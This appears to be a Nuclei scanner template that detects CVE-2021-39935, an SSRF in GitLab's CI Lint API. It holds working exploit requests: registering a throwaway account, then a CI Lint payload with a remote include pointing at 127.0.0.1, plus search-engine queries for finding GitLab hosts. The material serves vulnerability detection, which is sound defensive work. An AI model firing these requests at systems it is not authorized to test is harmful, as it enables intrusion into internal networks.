id: CVE-2021-39935

info:
  name: GitLab 10.5 < 14.3.6 / 14.4 < 14.4.4 / 14.5 < 14.5.2 - Server Side Request Forgery
  author: daffainfo
  severity: medium
  description: |
    An issue has been discovered in GitLab CE/EE affecting all versions starting from 10.5 before 14.3.6, all versions starting from 14.4 before 14.4.4, all versions starting from 14.5 before 14.5.2. Unauthorized external users could perform Server Side Requests via the CI Lint API
  impact: |
   Attackers can perform server-side requests, potentially leading to data exfiltration, internal network access, or other malicious activities.
  remediation: |
    Update to GitLab version 14.3.6, 14.4.4, or 14.5.2 or later.
  reference:
    - https://about.gitlab.com/releases/2021/12/06/security-release-gitlab-14-5-2-released/
    - https://gitlab.com/gitlab-org/gitlab/-/issues/346187
    - https://nvd.nist.gov/vuln/detail/cve-2021-39935
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:N/A:N
    cvss-score: 6.8
    cve-id: CVE-2021-39935
    cwe-id: CWE-918
    cpe: cpe:2.3:a:gitlab:gitlab:*:*:*:*:community:*:*:*,cpe:2.3:a:gitlab:gitlab:*:*:*:*:enterprise:*:*:*
  metadata:
    max-request: 3
    vendor: gitlab
    product: gitlab
    shodan-query:
      - http.title:"GitLab"
      - cpe:"cpe:2.3:a:gitlab:gitlab"
      - http.title:"gitlab"
    fofa-query: title="gitlab"
    google-query: intitle:"gitlab"
  tags: cve,cve2021,gitlab,ssrf,oast,kev,vkev

flow: http(1) && http(2) && http(3)

variables:
  first_name: '{{randbase(5)}}'
  last_name: '{{randbase(5)}}'
  username: "{{rand_base(6)}}"
  password: "{{rand_base(8)}}"
  email: "{{randstr}}@{{rand_base(5)}}.com"

http:
  - raw:
      - |
        GET /users/sign_up HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'contains_all(body, "authenticity_token", "csrf-token", "Username", "Password")'
        condition: and
        internal: true

    extractors:
      - type: regex
        name: authenticity_token
        part: body
        group: 1
        regex:
          - '<meta name="csrf-token" content="(.*?)" />'
        internal: true

  - raw:
      - |
        POST /users HTTP/1.1
        Host: localhost
        Content-Type: application/x-www-form-urlencoded

        utf8=%E2%9C%93&authenticity_token={{url_encode(authenticity_token)}}&new_user%5Bfirst_name%5D={{first_name}}&new_user%5Blast_name%5D={{last_name}}&new_user%5Busername%5D={{username}}&new_user%5Bemail%5D={{email}}&new_user%5Bpassword%5D={{password}}

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 302'
          - 'contains(set_cookie, "_gitlab_session")'
          - 'contains(location, "/users/sign_up/welcome")'
        condition: and
        internal: true

  - raw:
      - |
        POST /api/v4/ci/lint?include_merged_yaml=true HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"content":"include:\n  remote: http://127.0.0.1/{{randbase(4)}}.yml"}

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'does not have valid YAML syntax!'

      - type: word
        part: content_type
        words:
          - 'application/json'

      - type: status
        status:
          - 200
